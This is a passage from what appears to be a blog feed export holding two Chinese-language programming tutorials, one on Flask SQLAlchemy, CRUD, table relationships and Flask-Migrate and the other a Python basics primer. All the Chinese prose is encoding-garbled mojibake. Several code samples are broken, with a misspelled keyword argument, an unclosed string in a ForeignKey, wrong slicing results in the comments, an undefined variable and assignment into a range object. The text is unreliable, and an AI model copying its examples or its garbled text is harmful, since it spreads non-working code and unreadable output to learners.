ä½¿ç”¨ MVC çš„å¥½è™•åœ¨æ–¼å¯ä»¥ç”¨æ›´é«˜éšçš„è§’åº¦å»æ€è€ƒæ•´å€‹ç¨‹å¼æ¶æ§‹æé«˜ç¨‹å¼å¯é‡ç”¨æ€§å’Œé™ä½ç¨‹å¼è€¦åˆæ€§ã€‚ äº‹å¯¦ä¸Š Djangoã€Rails å’Œ ASP.NET MVC ç­‰è¼ƒæˆç†Ÿçš„ Web æ¡†æ¶ä¹Ÿæ˜¯åƒè€ƒ MVC çš„æ¶æ§‹å»è¨­è¨ˆã€‚
ä»€éº¼æ˜¯é—œè¯å¼è³‡æ–™åº«ï¼ˆRDBï¼‰ï¼ŸDatabase è³‡æ–™åº«ä¸€å€‹è³‡æ–™å„²å­˜çš„é›†åˆï¼Œæ–¹ä¾¿æˆ‘å€‘å»è®€å–æ–°å¢åˆªé™¤ä¿®æ”¹ï¼Œè€Œ Relational Databaseï¼ˆé—œè¯å¼è³‡æ–™åº«ï¼‰å»£æ³›æ‡‰ç”¨è³‡æ–™åº«æ‡‰ç”¨ç¨‹å¼ä¸­ï¼Œå®ƒæŠŠè³‡æ–™å„²å­˜åœ¨è¡Œåˆ—è¡¨æ ¼ä¸­ï¼Œæœ‰å¯èƒ½ä¸åŒè³‡æ–™è¡¨çš„å…§å®¹æœƒå½¼æ­¤ä¾è³´é—œè¯ã€‚å¸¸è¦‹çš„é—œè¯å¼è³‡æ–™åº«ï¼Œä¾‹å¦‚ï¼šMySQLã€Postgresã€Oracleã€MSSSQLã€SQLiteï¼Œæœ¬æ–‡æˆ‘å€‘å°‡ä½¿ç”¨ SQLite é€™å€‹è¼•é‡ç´šçš„é—œè¯å¼è³‡æ–™åº«ä¾†ç•¶åšç¯„ä¾‹æ•™å­¸ã€‚
ä»€éº¼æ˜¯ ORMï¼ŸORM æŒ‡çš„æ˜¯ Object Relational Mappingï¼ˆç‰©ä»¶é—œè¯å°æ‡‰ï¼‰ï¼Œæ˜¯ä¸€ç¨®ç¨‹å¼è¨­è¨ˆæŠ€è¡“ï¼Œç”¨æ–¼å¯¦ç¾ç‰©ä»¶å°å‘ç¨‹å¼èªè¨€è£¡ä¸åŒé¡å‹ç³»çµ±çš„è³‡æ–™ä¹‹é–“çš„è½‰æ›ã€‚ä¸€èˆ¬è€Œè¨€ç‰©ä»¶å°å‘æ˜¯å¾è»Ÿé«”å·¥ç¨‹åŸºæœ¬åŸå‰‡ï¼ˆä¾‹å¦‚ï¼šè€¦åˆã€èšåˆã€å°è£ï¼‰çš„åŸºç¤ä¸Šç™¼å±•èµ·ä¾†çš„ï¼Œç„¶è€Œé—œè¯å¼è³‡æ–™åº«å‰‡æ˜¯å¾æ•¸å­¸ç†è«–ç™¼å±•è€Œä¾†çš„ï¼Œå…©å¥—ç†è«–å­˜åœ¨é¡¯è‘—çš„å€åˆ¥ã€‚ç‚ºäº†è§£æ±ºé€™å€‹ä¸ç¬¦åˆçš„ç¾è±¡ï¼Œç‰©ä»¶é—œè¯å°æ˜ æŠ€è¡“æ¬æ¼”è‘—ä¸­ä»‹å±¤çš„è§’è‰²ï¼Œè®“é–‹ç™¼å¯ä»¥ä½¿ç”¨ç‰©ä»¶æ–¹å¼ä¾†æ“ä½œè³‡æ–™åº«ï¼Œè€Œä¸ç”¨ä½¿ç”¨ SQL èªæ³•ï¼Œç•¶ç„¶è‹¥æ˜¯è¦ä½¿ç”¨è¤‡é›œçš„æ“ä½œï¼Œä»éœ€è¦ä½¿ç”¨åˆ° SQL èªæ³•ã€‚
æ›´å¤š SQL èªæ³•å­¸ç¿’ï¼šSQLèªæ³•æ•™å­¸- 1Keydata
 
Flask SQLAlchemy ä½¿ç”¨è¨­å®šSQLAlchemy æ˜¯ Python ç¤¾ç¾¤æœ€å»£æ³›ä½¿ç”¨çš„ ORM å¥—ä»¶ã€‚ç‚ºäº†æ–¹ä¾¿ä½¿ç”¨ ORM ä¾†æ“ä½œè³‡æ–™åº«ï¼Œæˆ‘å€‘ä½¿ç”¨ SQLAlchemy çš„å°è£ Flask SQLAlchemy ä¾†é€²è¡Œ Models çš„å»ºç«‹ï¼ˆç•¶ç„¶ä½ ä¹Ÿå¯ä»¥å–®ç¨ä½¿ç”¨ SQLAlchemyï¼‰ã€‚ä»¥ä¸‹æ˜¯ SQLAlchemy ä½¿ç”¨çš„ç°¡å–®ç¯„ä¾‹ï¼š
main.pyfrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)# è¨­å®šè³‡æ–™åº«ä½ç½®ï¼Œä¸¦å»ºç«‹ appapp.config[&#x27;SQLALCHEMY_DATABASE_URI&#x27;] = &#x27;sqlite:////tmp/test.db&#x27;db = SQLAlchemy(app)

models.py# å»ºç«‹è³‡æ–™è¡¨æ¬„ä½from main import dbclass Todo(db.Model):    # __table__name = &#x27;user_table&#x27;ï¼Œè‹¥ä¸å¯«å‰‡çœ‹ class name    # è¨­å®š primary_key    id = db.Column(db.Integer, primary_key=True)    content = db.Column(db.String(80))    def __init__(self, content):        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.content

manage.pyfrom flask_script import Manager, Serverfrom main import appfrom models import Todo# è¨­å®šä½ çš„ appmanager = Manager(app)# è¨­å®š python manage.py runserver ç‚ºå•Ÿå‹• server æŒ‡ä»¤manager.add_command(&#x27;runserver&#x27;, Server())# è¨­å®š python manage.py shell ç‚ºå•Ÿå‹•äº’å‹•å¼æŒ‡ä»¤ shell çš„æŒ‡ä»¤ @manager.shelldef make_shell_context():    return dict(app=app, Todo=Todo)if __name__ == &#x27;__main__&#x27;:    manager.run()

æ“ä½œæŒ‡ä»¤ï¼š
$ python manage.py shell&gt;&gt;&gt; db.create_all()

CRUD æ“ä½œè¨­è¨ˆCRUD æ˜¯ä¸€èˆ¬ç¶²è·¯æ‡‰ç”¨ç¨‹å¼æœ€å¸¸è¦‹çš„è³‡æ–™åº«æ“ä½œï¼ˆcreate, read, update, deleteï¼‰ï¼Œæ¥è‘—æˆ‘å€‘è¦ä½¿ç”¨ session ä¾†æ“ä½œæˆ‘å€‘çš„ CRUD åŠŸèƒ½ï¼Œé¦–å…ˆå…ˆåœ¨çµ‚ç«¯æ©Ÿä¸­è¼¸å…¥ $ python manage.py shell å¾Œé€²è¡Œè³‡æ–™åº«æŒ‡ä»¤æ¨¡æ“¬æ“ä½œï¼ˆè¦æ³¨æ„çš„æ˜¯ Flask SQLAlchemy é‡å°æ¯å€‹ request æœƒå‰µå»ºä¸€å€‹æ–°çš„ sessionï¼Œè‹¥æ²’æœ‰ commit çš„æ“ä½œå³è¢«ä¸Ÿæ£„ï¼‰ï¼š

æ–°å¢ï¼ˆCreateï¼‰ æ–°å¢ä¸€ç­†è³‡æ–™å¾Œå°‡å®ƒåŠ åˆ° db.session ä¸­ï¼Œå®Œæˆ commitï¼š
 &gt;&gt;&gt; todo = Todo(content=&#x27;hacking&#x27;)&gt;&gt;&gt; db.session.add(todo)&gt;&gt;&gt; db.session.commit()

è®€å–ï¼ˆReadï¼‰Model.query æ˜¯ db.session.query(Model) çš„ç°¡å¯«ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è®€å–è³‡æ–™åº«è³‡æ–™ï¼š
 # å–å¾—æ‰€æœ‰ todo è³‡æ–™&gt;&gt;&gt; todos = Todo.query.all()&gt;&gt;&gt; todos# é™åˆ¶ 1 ç­†è³‡æ–™&gt;&gt;&gt; todos = Todo.query.limit(1).all()# æ­£å‘/é€†å‘æ’åº&gt;&gt;&gt; todos = Todo.query.order_by(Todo.content).all()&gt;&gt;&gt; todos = Todo.query.order_by(Todo.content.desc()).all()# å–å¾—ç¬¬ä¸€ç­†è³‡æ–™&gt;&gt;&gt; todo = Todo.query.first()# å–å¾— primary key=1 ä¸€ç­†è³‡æ–™&gt;&gt;&gt; todo = Todo.query.get(1)


åˆ†é ï¼ˆPaginationï¼‰

 &gt;&gt;&gt; todos = Todo.query.paginate(1, 10)# ç¸½é æ•¸&gt;&gt;&gt; todos.pages# ä¸Š/ä¸‹ä¸€é &gt;&gt;&gt; todos.prev()&gt;&gt;&gt; todos.next()&gt;&gt;&gt; 


æ¢ä»¶æŸ¥è©¢ï¼ˆFilterï¼‰

 &gt;&gt;&gt; todo = Todo.query.filter_by(content=&#x27;hacking&#x27;).first()

 &gt;&gt;&gt; todos = Todo.query.filter(Todo.id &gt; 1).all()

ä¿®æ”¹ï¼ˆUpdateï¼‰
 &gt;&gt;&gt; todo = Todo.query.filter_by(contant=&#x27;hacking&#x27;).update(&#123;    &#x27;content&#x27;: &#x27;reading&#x27;&#125;)&gt;&gt;&gt; db.session.commit()

åˆªé™¤ï¼ˆDeleteï¼‰
 &gt;&gt;&gt; todo = Todo.query.filter_by(content=&#x27;reading&#x27;).first()&gt;&gt;&gt; db.session.delete(todo)&gt;&gt;&gt; db.session.commit()

è³‡æ–™åº«é—œè¯ç”¨æ³•åœ¨é—œè¯å¼è³‡æ–™åº«ä¸­ï¼Œæœ€é‡è¦çš„å°±æ˜¯è³‡æ–™è¡¨ä¹‹é–“çš„é—œè¯ï¼Œé€éé—œè¯çš„ä½¿ç”¨ï¼Œå¯ä»¥è®“æˆ‘å€‘å–å¾—æˆ‘å€‘æƒ³è¦çš„è³‡æ–™ã€‚èˆ‰ä¾‹è€Œè¨€ï¼Œä¸€ç¯‡éƒ¨è½æ ¼æ–‡ç« é€šå¸¸æœƒå°æ‡‰å¤šå‰‡è©•è«–ï¼Œæ‰€ä»¥è‹¥æ˜¯å»ºç«‹å¥½é—œä¿‚å‰‡å¯ä»¥é€éæ–‡ç« å»å–å¾—æ‰€æœ‰å’Œé€™ç¯‡æ–‡ç« æœ‰é—œçš„è©•è«–ã€‚åŒç†ï¼Œä¸€ç¯‡æ–‡ç« é€šå¸¸æœƒæœ‰å¤šå€‹ tagï¼Œè€Œä¸€å€‹ tag é€šå¸¸å°æ‡‰å¤šç¯‡æ–‡ç« ï¼Œæ‰€ä»¥æ˜¯å€‹å¤šå°å¤šé—œä¿‚ã€‚

ä¸€å°å¤š

models.py# å»ºç«‹è³‡æ–™è¡¨æ¬„ä½from main import dbclass Todo(db.Model):    # __table__name = &#x27;user_table&#x27;ï¼Œè‹¥ä¸å¯«å‰‡çœ‹ class name    # è¨­å®š primary_key    id = db.Column(db.Integer, primary_key=True)    content = db.Column(db.String(80))    user_id = db.Column(db.String(80), db.ForeignKey(&#x27;user.id))    def __init__(self, content):        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.contentclass User(db.Model):    id = db.Column(db.Integer, primary_key=True)    name = db.Column(db.String(80))    todos = db.relationship(        &#x27;Todo&#x27;,        backref=&#x27;user&#x27;, # ref å¯ä»¥è®“æˆ‘å€‘ä½¿ç”¨ Todo.user é€²è¡Œå° User æ“ä½œ        lazy=&#x27;dynamic&#x27; # æœ‰ä½¿ç”¨æ‰è¼‰å…¥ï¼Œææ˜‡æ•ˆèƒ½    )    def __init__(self, name):        self.name = name    def __repr__(self):        return &#x27;&lt;User %r&gt;&#x27; % self.name

æ“ä½œæ–¹å¼ï¼š
&gt;&gt;&gt; user = User.query.get(1)&gt;&gt;&gt; new_todo = Todo(&#x27;Booking&#x27;)&gt;&gt;&gt; new_todo.user_id = user.id&gt;&gt;&gt; db.session.add(new_todo)&gt;&gt;&gt; db.session.commit()&gt;&gt;&gt; user.todos



å¤šå°å¤š

models.pytags = db.Table(&#x27;todo_tags&#x27;,    db.Column(&#x27;todo_id&#x27;, db.Integer, db.ForeignKey(&#x27;todo.id&#x27;)),    db.Column(&#x27;tag_id&#x27;, db.Integer, db.ForeignKey(&#x27;tag.id&#x27;)))# å»ºç«‹è³‡æ–™è¡¨æ¬„ä½from main import dbclass Post(db.Model):    # __table__name = &#x27;user_table&#x27;ï¼Œè‹¥ä¸å¯«å‰‡çœ‹å°å¯« class name    # è¨­å®š primary_key    id = db.Column(db.Integer, primary_key=True)    title = db.Column(db.String(80))    content = db.Column(db.String(80))    def __init__(self, title, content):        self.title = title        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.contentclass Tag(db.Model):    # __table__name = &#x27;user_table&#x27;ï¼Œè‹¥ä¸å¯«å‰‡çœ‹ class name    # è¨­å®š primary_key    id = db.Column(db.Integer, primary_key=True)    title = db.Column(db.String(80))    def __init__(self, title):        self.title = title    def __repr__(self):        return &#x27;&lt;Tag %r&gt;&#x27; % self.title

æ“ä½œæ–¹å¼ï¼š
# å‰µå»º 3 å€‹ todo&gt;&gt;&gt; todo_1 = Todo(&#x27;Python&#x27;)&gt;&gt;&gt; todo_2 = Todo(&#x27;JS&#x27;)&gt;&gt;&gt; todo_3 = Todo(&#x27;R&#x27;)&gt;&gt;&gt; tag_1 = Tag(&#x27;coding&#x27;)&gt;&gt;&gt; tag_1.tags = [todo_1, todo_2]&gt;&gt;&gt; db.session.add()&gt;&gt;&gt; db.session.commit()

 
Flask Migrationï¼ˆAlembicï¼‰ä½¿ç”¨éš¨è‘—ç¶²è·¯æ‡‰ç”¨ç¨‹å¼çš„ç™¼å±•ï¼Œæˆ‘å€‘çš„ models æœƒä¸æ–·è®Šæ›´ï¼Œç‚ºäº†è¨˜éŒ„æ‰€æœ‰æœ‰é—œ models çš„æ”¹å‹•ï¼Œæˆ‘å€‘ä½¿ç”¨ Flask-Migrate é€™å€‹ extensionsã€‚æ‰€æœ‰ models æ”¹å‹•éƒ½æœƒè¨˜éŒ„åœ¨ migration æª”æ¡ˆä¸­ï¼Œå°±åƒæ˜¯è³‡æ–™åº«çš„ git ä¸€æ¨£æ–¹ä¾¿ç‰ˆæœ¬æ§åˆ¶ã€‚
å®‰è£ Flask-Migrateï¼š
$ pip install Flask-Migrate

å°‡ db åŠ å…¥ Flask-Migrate æ§åˆ¶ï¼š
manage.pyfrom flask_migrate import Migrate, MigrateCommandfrom flask_script import Manager, Serverfrom main import appfrom models import Todo# è¨­å®šä½ çš„ appmanager = Manager(app)# è¨­å®š python manage.py db ä¾†ç®¡ç† modelsmanager.add_command(&#x27;db&#x27;, MigrateCommand)# è¨­å®š python manage.py runserver ç‚ºå•Ÿå‹• server æŒ‡ä»¤manager.add_command(&#x27;runserver&#x27;, Server())# è¨­å®š python manage.py shell ç‚ºå•Ÿå‹•äº’å‹•å¼æŒ‡ä»¤ shell çš„æŒ‡ä»¤ @manager.shelldef make_shell_context():    return dict(app=app, Todo=Todo)if __name__ == &#x27;__main__&#x27;:    manager.run()    

ä½¿ç”¨ Flask-Migrate æ“ä½œ DBï¼š
# åˆå§‹åŒ–$ python manage.py db init# è¨˜éŒ„ model è®ŠåŒ–$ python manage.py db migrate# æ›´æ–°åŒæ­¥åˆ° db$ python manage.py db upgrade# æŸ¥è©¢æŒ‡ä»¤$ python manage.py db --help

ç¸½çµæœ¬æ–‡ä»‹ç´¹äº†è³‡æ–™åº«ã€é—œè¯å¼è³‡æ–™åº«ã€ORM çš„æ¦‚å¿µï¼Œæˆ‘å€‘ä¹Ÿå¯¦éš›ä½¿ç”¨äº† Flask SQLAlchemy å’Œ Flask-Migrate ä¾†æ“ä½œæˆ‘å€‘çš„è³‡æ–™åº«ã€‚åœ¨æ¥ä¸‹ä¾†ç« ç¯€ä¸­æˆ‘å€‘å°‡æŒçºŒä»‹ç´¹ Python Web Flask å¯¦æˆ°é–‹ç™¼ï¼Œä¸¦å­¸ç¿’ç¾ä»£åŒ–ç¶²ç«™é–‹ç™¼çš„æ–¹æ–¹é¢é¢ã€‚
å»¶ä¼¸é–±è®€
Wiki MVC
Python Web ç¨‹å¼è¨­è¨ˆå…¥é–€å¯¦æˆ°ç·šä¸Šèª²ç¨‹

ï¼ˆimage via basicsofwebdevelopmentï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, æ•™å­¸, Flask, æ¡†æ¶, ç¶²ç«™é–‹ç™¼, Anaconda, ORM, SQLAlchemy, Database, Models, MVC, è³‡æ–™åº«</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 101 å¿«é€Ÿå…¥é–€æ•™å­¸</title>
    <url>/2016/12/17/python101-tutorial/</url>
    <content><![CDATA[ 
ä»€éº¼æ˜¯ Pythonï¼ŸPython æ˜¯ä¸€ç¨®ç‰©ä»¶å°å‘ã€ç›´è­¯å¼çš„è·¨å¹³å°é›»è…¦ç¨‹å¼èªè¨€ï¼Œå®ƒåŒ…å«äº†ä¸€çµ„åŠŸèƒ½å®Œå‚™çš„æ¨™æº–åº«å’Œè±å¯Œå¥—ä»¶ç”Ÿæ…‹ç³»ï¼Œå¯ä»¥è¼•é¬†å®Œæˆå¾ˆå¤šå¸¸è¦‹çš„ä»»å‹™ï¼ˆä¾‹å¦‚ï¼šè®€å¯«æª”æ¡ˆã€è‡ªç„¶èªè¨€è™•ç†ã€ç¶²è·¯çˆ¬èŸ²ã€ç¶²ç«™é–‹ç™¼ã€æ©Ÿå™¨å­¸ç¿’ç­‰ï¼‰ï¼Œå› ç‚ºå®ƒå¯ä»¥å¾ˆè¼•æ˜“æ•´åˆå…¶ä»–åº•å±¤èªè¨€ï¼Œæ‰€ä»¥åˆç¨±ç‚ºè† æ°´èªè¨€ã€‚å®ƒçš„èªæ³•ç°¡å–®ï¼Œèˆ‡å…¶å®ƒå¤§å¤šæ•¸ç¨‹å¼è¨­è¨ˆèªè¨€ä½¿ç”¨å¤§æ‹¬å¼§ä¸ä¸€æ¨£ï¼Œå®ƒä½¿ç”¨ç¸®é€²ä¾†å®šç¾©èªå¥å¡Šã€‚ç”±æ–¼å…·å‚™ç°¡æ½”æ˜“å­¸ç­‰ç‰¹æ€§ï¼Œè¨±å¤šé–‹ç™¼è€…æ¨è–¦ Python ç‚ºåˆå­¸è€…ç¬¬ä¸€å€‹å­¸ç¿’çš„ç¨‹å¼èªè¨€ã€‚ç”±æ–¼ç‰ˆæœ¬æ›´è¿­ï¼Œæˆ‘å€‘æ¥ä¸‹ä¾†è¨è«–çš„ä¸»è¦æ˜¯ä»¥ Python3 ç‚ºä¸»ï¼Œè‹¥é›»è…¦æ²’æœ‰å®‰è£çš„è©±ï¼Œä½ å¯ä»¥åœ¨å®˜æ–¹ç¶²ç«™ä¸‹è¼‰ï¼Œè‹¥ä½ ä¸æ˜¯å®‰è£ Anaconda é€™å€‹ all-in-one ç‰ˆæœ¬çš„è©±ï¼ˆè‡ªå¸¶è¨±å¤šå¥—ä»¶å’Œç§‘å­¸é‹ç®—å·¥å…·ï¼‰ï¼Œè¨˜å¾—è¦å®‰è£ pipã€IPythonã€‚ 
Python è¨­è¨ˆé¢¨æ ¼Python ä¸»è¦è¨­è¨ˆçš„åŸå‰‡å’Œç‰¹è‰²å°±åœ¨æ–¼ç°¡æ½”ï¼šæ‡‰è©²æœƒæœ‰ä¸€ç¨®æ˜é¡¯çš„ä½œæ³•ï¼ˆæœ€å¥½ä¹Ÿåªæœ‰ä¸€ç¨®ï¼‰ï¼Œå¯ä»¥å®Œæˆå·¥ä½œã€‚
æ›´å¤šæœ‰é—œ Python è¨­è¨ˆé¢¨æ ¼å¯ä»¥åœ¨çµ‚ç«¯æ©Ÿé€²å…¥ python3 äº’å‹•æ¨¡å¼å¾Œè¼¸å…¥ import thisï¼š
$ python3Python 3.5.2 (default, Oct 11 2016, 05:00:16)[GCC 4.2.1 Compatible Apple LLVM 7.0.2 (clang-700.1.81)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import thisThe Zen of Python, by Tim PetersBeautiful is better than ugly.Explicit is better than implicit.Simple is better than complex.Complex is better than complicated.Flat is better than nested.Sparse is better than dense.Readability counts.Special cases aren&#x27;t special enough to break the rules.Although practicality beats purity.Errors should never pass silently.Unless explicitly silenced.In the face of ambiguity, refuse the temptation to guess.There should be one-- and preferably only one --obvious way to do it.Although that way may not be obvious at first unless you&#x27;re Dutch.Now is better than never.Although never is often better than *right* now.If the implementation is hard to explain, it&#x27;s a bad idea.If the implementation is easy to explain, it may be a good idea.Namespaces are one honking great idea -- let&#x27;s do more of those!

ç©ºç™½æ ¼å¼é¦–å…ˆï¼Œæˆ‘å€‘è¦äº†è§£ Python å’Œå…¶ä»–èªè¨€æœ€å¤§çš„ä¸åŒå°±æ˜¯ä½¿ç”¨ç¸®æ’ä¾†åˆ‡åˆ†ç¨‹å¼ç¢¼ï¼Œé€™å’Œå…¶ä»–èªè¨€ä½¿ç”¨ {} ä¸åŒã€‚
for i in [1, 2, 3]:	print(i)	for j in [1, 2, 3, 4]:		print(j + i)print(&#x27;finish&#x27;)

ä¸éåˆå­¸è€…å¾ˆå®¹æ˜“åœ¨ç¸®æ’é‡åˆ°å•é¡Œï¼Œè‹¥æ˜¯å‡ºç¾ä»¥ä¸‹è¨Šæ¯å°±å¯ä»¥æª¢è¦–æ˜¯å¦å“ªè£¡ç¸®æ’æœ‰å•é¡Œï¼š
IndentationError: expected an indented block

æ¨¡çµ„åœ¨ Python ç”Ÿæ…‹ç³»ä¸­æœ‰è±å¯Œçš„æ¨¡çµ„å’Œå·¥å…·ã€‚ä¸€èˆ¬æƒ…æ³é è¨­ä¸æœƒè¼‰å…¥ä»»ä½•æ¨¡çµ„ï¼Œä½†ç•¶ä½ æœ‰ç‰¹å®šé–‹ç™¼éœ€æ±‚å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·å°‡æ¨¡çµ„åŒ¯å…¥ï¼ˆimportï¼‰ã€‚è‹¥æ˜¯ç•¶æ¨¡çµ„åç¨±å¾ˆé•·æ™‚é€šå¸¸æˆ‘å€‘æœƒä½¿ç”¨åˆ¥åã€‚
import re as regexmy_regex = regex.compile(&#x27;[0-9]+&#x27;, regex.I)

è‹¥æ˜¯åªæ˜¯éœ€è¦æ¨¡çµ„ä¸­çš„ç‰¹å®šåŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ¯”è¼ƒç²¾æº–çš„å¼•å…¥æ–¹å¼ from importï¼Œå¼•å…¥åˆ°æ•´å€‹å‘½åç©ºé–“ä¸­ï¼Œä½¿ç”¨æ™‚å‰é¢å°±ä¸ç”¨å¯«æ¨¡çµ„åï¼ˆä½†è¦æ³¨æ„æœ‰å¯èƒ½è¦†å¯«ï¼‰ï¼š
from collections import defaultdict, Counterlookup = defaultdict(int)my_counter = Counter()

è³‡æ–™å‹åˆ¥åœ¨ Python æœ‰ä»¥ä¸‹å¹¾ç¨®å…§å»ºçš„è³‡æ–™å‹åˆ¥ï¼ŒåŸºæœ¬è³‡æ–™å‹åˆ¥æœ‰ Numberã€Stringã€Boolean

æ•¸å­—ï¼ˆNumberï¼‰
 num1 = 3num2 = 2num3 = num1 / num2

å­—ä¸²ï¼ˆStringï¼‰ å­—ä¸²ä½¿ç”¨ä¸Šæœƒä½¿ç”¨å–®å¼•è™Ÿæˆ–é›™å¼•è™Ÿæˆå°åŒ…èµ·ï¼ˆâ€™, â€œï¼‰
 str = &#x27;data engineer&#x27;# å­—ä¸²é•·åº¦len(str)# åŸå§‹å­—å…ƒes_str = r&#x27;\t&#x27;# 2len(es_str)

 è‹¥æ˜¯å¤šè¡Œçš„æƒ…å½¢ï¼š
 multi_line_str = &quot;&quot;&quot;å¤šè¡Œå¤šè¡Œ&quot;&quot;&quot; 

å¸ƒæ—å€¼ï¼ˆBooleanï¼‰ æ±ºå®šé‚è¼¯åˆ¤æ–·ï¼ŒTrue æˆ– Falseã€‚æ³¨æ„åœ¨ Python ä¸­å¸ƒæ—å€¼é¦–å­—æ˜¯å¤§å¯«
 is_num_bigger_than_one = 1 &lt; 2

 åœ¨ Python ä¸­ None åœ°ä½é¡ä¼¼æ–¼ null
 x = Noneprint(x == None)
 ä»¥ä¸‹ç‚º Python çš„ Falsy å€¼ï¼š

False 
None
[]
{}
â€œâ€
set()
0
0.0

 å¯ä»¥æ­é… and, or, not ä½¿ç”¨

åˆ—è¡¨ï¼ˆListï¼‰ åˆ—è¡¨å¯ä»¥èªªæ˜¯ Python ä¸­æœ€åŸºç¤çš„ä¸€ç¨®è³‡æ–™çµæ§‹ã€‚æ‰€è¬‚åˆ—è¡¨æŒ‡çš„å°±æ˜¯ä¸€ç¾¤æŒ‰ç…§é †åºæ’åºçš„å…ƒç´ ï¼ˆé¡ä¼¼æ–¼å…¶ä»–ç¨‹å¼èªè¨€çš„ arrayï¼Œä½†å¤šä¸€äº›é¡å¤–åŠŸèƒ½ï¼‰ã€‚
 list_num = [1, 2, 3]list = [&#x27;string&#x27;, 1, [], list_num]list_length = len(list_num)	num_sum = sum(list_num)print(list_length)print(num_sum)

 é‹ç”¨ [] å–å€¼ï¼ˆindex å¾ 0 é–‹å§‹ï¼‰ï¼š
 x = range(10) # [0, 1, 2, ..., 9]zero = x[0] # 0nine = x[-1] # 9x[0] = -1

 åˆ‡å‰²ï¼ˆ[èµ·å§‹ index, çµæŸ index ä½†ä¸åŒ…å«]ï¼‰ï¼š
 print(x[:3]) # [-1, 1, 2]print(x[3:]) # [3, 4, 5,..., 9]print(x[1:5]) # [1, 2, 3, 4]print(x[0:-1]) # [1, 2, ..., 8]print(x[-1:-1]) # [-1, 1, ..., 9]

 æª¢æŸ¥å…ƒç´ æ˜¯å¦åœ¨åˆ—è¡¨ä¸­ï¼ˆé€ä¸€æª¢æŸ¥ï¼Œæ•ˆç‡è¼ƒå·®ï¼‰ï¼š
 1 in [1, 2, 3] # True

 ä¸²æ¥åˆ—è¡¨ï¼š
 x = [1, 2, 3]x.extend([4, 5, 6])

 x = [1, 2, 3]y = x + [4, 5, 6]

 x = [1, 2, 3]x.append(0) # [1, 2, 3, 0]

 è³¦å€¼æ–¹å¼ï¼š
 x, y = [1, 2]

 _, y = [1, 2]

å…ƒçµ„ï¼ˆTupleï¼‰ Tuple é¡ä¼¼æ–¼ List çš„å…„å¼Ÿï¼Œæ¯”è¼ƒå¤§å·®åˆ¥åœ¨æ–¼ Tuple æ˜¯ immutableï¼Œä¹Ÿå°±æ˜¯èªªå®£å‘Šå¾Œä¸èƒ½ä¿®æ”¹ã€‚åˆ—è¡¨ä½¿ç”¨ []ï¼Œè€Œå…ƒçµ„ä½¿ç”¨ ()
 my_list = [1, 2]my_tuple = (1, 2)my_list[1] = 3try:	my_tuple[1] = 4except TypeError:	print(&#x27;cannot modify a tuple&#x27;)

 å¤šé‡è³¦å€¼
 x, y = 1, 2x, y = y, x # x == 2, y == 1

å­—å…¸ï¼ˆDictionaryï¼‰
 å­—å…¸é¡ä¼¼ mapï¼ŒåŒ…å«éµå€¼èˆ‡å°æ‡‰çš„å€¼ï¼Œå¯ä»¥å¿«é€Ÿå–å‡ºå°æ‡‰å€¼ï¼š
 dict1 = &#123;&#125; # å»ºè­°å¯«æ³•dirct2 = dict()grades = &#123; &#x27;Mark&#x27;: 70, &#x27;Jack&#x27;: 40 &#125;grades[&#x27;Mark&#x27;]

 çµ¦å®šå€¼ï¼š
 grades[&#x27;KD&#x27;] = 100len(grades) # 3

 ä½¿ç”¨äº‹å…ˆæª¢é©—éµæˆ–æ˜¯ä½¿ç”¨ get æ–¹æ³•ï¼š
 try:	grade = grades[&#x27;XD&#x27;]except KeyError:	print(&#x27;no grade for XD&#x27;)grades.get(&#x27;XD&#x27;, 40) # è‹¥ç„¡å‰‡ä½¿ç”¨ default å€¼

 å–å‡ºæ‰€æœ‰å€¼ï¼š
 grades = &#123; &#x27;Mark&#x27;: 70, &#x27;Jack&#x27;: 40 &#125;grades.keys() # æ‰€æœ‰éµå€¼çµ„æˆçš„ listgrades.values() # æ‰€æœ‰å€¼çµ„æˆçš„ listgrades.items() # æ‰€æœ‰éµå€¼çµ„æˆçš„ tuple of list [(&#x27;Mark&#x27;, 70)]

 defaultdictï¼š
 ç•¶ä½ æª¢æŸ¥ä¸€å€‹ä¸å­˜åœ¨çš„éµå€¼æ™‚ï¼Œæœƒç”¨é›¶åƒæ•¸å‡½å¼æ·»åŠ ä¸€å€‹äº‹å…ˆè¨­å®šçš„æ–°å€¼ï¼Œé€™æ˜¯ä¸€ç¨®æ¯”è¼ƒå„ªé›…çš„ä½œæ³•
 åœ¨ä»‹ç´¹ defaultdict ä¹‹å‰å…ˆä»‹ç´¹ä¸€èˆ¬ä½œæ³•
 # ä¾‹å¤–è™•ç†word_counts = &#123;&#125;for word in document:	try:		word_counts[word] += 1	except KeyError:		word_counts[word] = 1# ä½¿ç”¨ getword_counts = &#123;&#125;for word in document:	previous = word_counts.get(word, 0)	word_counts[word] = previous_count + 1

 defaultdict ä½œæ³•ï¼ˆä¸ç”¨æ¯æ¬¡æª¢æŸ¥éµç›´è¦–å¦å­˜åœ¨ï¼‰
 # åŒ¯å…¥ defaultdictfrom collections import defaultdictword_counts = defaultdict(int) # æœƒç”Ÿæˆ 0for word in document:	word_counts[word] += 1

 ä¹Ÿå¯ä»¥ä½¿ç”¨ list æˆ– dict ç”šè‡³æ˜¯è‡ªå·±å®šç¾©çš„å‡½å¼ä¾†åšç‚º defaultdict çš„é›¶åƒæ•¸å‡½å¼ï¼š
